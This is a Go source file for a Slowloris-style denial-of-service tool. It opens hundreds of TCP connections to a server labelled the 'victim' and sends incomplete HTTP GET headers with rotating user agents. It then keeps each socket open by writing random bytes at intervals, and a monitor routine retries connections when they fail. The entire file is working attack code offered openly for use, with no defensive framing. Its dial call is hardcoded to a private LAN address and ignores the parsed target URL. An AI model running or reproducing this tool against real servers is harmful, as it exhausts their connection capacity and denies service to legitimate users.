package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net"
	"net/url"
	"os"
	"strings"
	"time"
)

type attackParams struct {
	serverURL     *url.URL
	connectionsNr *uint64
	timeout       *uint64
	agents        []string
}

type connection struct {
	payload *string
	id      int
	conn    net.Conn
}

func main() {
	attack := parseArguments()
	quit := make(chan bool)
	cons := int(*attack.connectionsNr)

	for i := 1; i <= cons; i++ {
		agent := getRandomAgent(attack.agents)
		url := attack.serverURL

		connection, err := createConnection(url, agent, i, quit)
		if err != nil {
			switch err.Err.(type) {
			case *os.SyscallError:
				// os related errors
				log.Println(err.Err)
				log.Println("Starting a new monitoring routine")
				log.Println(err.Temporary())
				go monitor(attack, "192.168.0.102:8080", i, quit)
			case *net.DNSError:
				// if we reached this case, then most
				// probably the host does not exists
				log.Println(err.Err)
				return
			default:
				fmt.Println("Unknown error, terminating the program")
				return
			}

			break
		} else {
			go connection.start(attack.timeout, quit)
		}
	}

	time.Sleep(time.Second * 60)
	close(quit)

	log.Println("Stopping the program")
}

// starts a new routine that continuously sends packets to the server
// to keep the connection
func (m *connection) start(timeout *uint64, quit chan bool) {
	log.Printf("Starting worker from socket = [%d]\n", m.id)
	defer m.conn.Close()

	log.Printf("Sending initial payload from socket = [%d]\n", m.id)
	packet := []byte(*m.payload)
	_, err := m.conn.Write(packet)
	if err != nil {
		log.Printf("Failed to send the initial packet for socket id=[%d]: %v", m.id, err)
	}

	sleep := time.Second * time.Duration(*timeout)

	for {
		select {
		case <-quit:
			log.Printf("Stop sending random packets to socket = [%d]\n", m.id)
			return
		default:
			time.Sleep(sleep)

			randPackets := make([]byte, 1)
			randPackets[0] = byte(rand.Intn(256))

			_, err = m.conn.Write(randPackets)
			if err != nil {
				log.Printf("Failed sending random packet to socket = [%d] to the server:\n\t%v\n", m.id, err)
				return
			}

			log.Printf("Sent random packet to socket = [%d]\n", m.id)
		}
	}
}

// tries to create as much tcp connections as possible
func monitor(attack *attackParams, victim string, id int, quit chan bool) {
	retry := time.Second * time.Duration(*attack.timeout)

	for {
		select {
		case <-quit:
			return
		default:
			time.Sleep(retry)

			log.Println("Trying to open a new socket from the monitor routine...")

			connection, err := createConnection(attack.serverURL, getRandomAgent(attack.agents), id, quit)
			if err != nil {
				continue
			}

			go connection.start(attack.timeout, quit)
			id++
		}
	}
}

func createConnection(url *url.URL, agent string, id int, quit chan bool) (*connection, *net.OpError) {
	payload := func() string {
		var path string
		if url.Path == "" {
			path = "/"
		} else {
			path = url.Path
		}

		return fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nUser-Agent:%s\r\n", path, url.Host, agent)
	}()

	// conn, err := net.Dial("tcp", "192.168.0.102:8080")
	conn, err := net.Dial("tcp", "192.168.0.102:8080")
	if err != nil {
		return nil, err.(*net.OpError)
	}

	return &connection{&payload, id, conn}, nil
}

func getRandomAgent(agents []string) string {
	length := len(agents)

	return agents[rand.Intn(length)]
}

func parseArguments() *attackParams {
	server := flag.String("s", "http://192.168.0.102:8080", "The network address of the victim")
	connectionsNr := flag.Uint64("c", 350, "The number of connections to establish with the victims server")
	timeout := flag.Uint64("t", 10, "The time between sending packets in every active connection (in seconds)")
	agentsPath := flag.String("ap", "agents.txt", "The file name with different user agents")
	flag.Parse()

	victimURL, err := url.ParseRequestURI(*server)
	fmt.Println(victimURL)
	if err != nil {
		log.Fatalln(err)
	}

	var userAgents []string
	agents, err := ioutil.ReadFile(*agentsPath)
	if err != nil {
		defaultUserAgent := "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
		log.Printf(`Failed to read the list of user agents
			Falling back to the default one
			Will use: %s`,
			defaultUserAgent)
		userAgents = append(userAgents, defaultUserAgent)
	} else {
		log.Println("Found the agents file")
		userAgents = strings.Split(string(agents), "\n")
	}

	attack := attackParams{
		serverURL:     victimURL,
		connectionsNr: connectionsNr,
		timeout:       timeout,
		agents:        userAgents,
	}

	return logSetup(&attack)
}

func logSetup(attack *attackParams) *attackParams {
	log.Printf("Attack will be performed on [%s]\n", attack.serverURL.String())
	log.Printf("Will try to establish [%d] connections to the server\n", *attack.connectionsNr)
	log.Printf("The timeout between messages is [%d] seconds\n", *attack.timeout)

	return attack
}
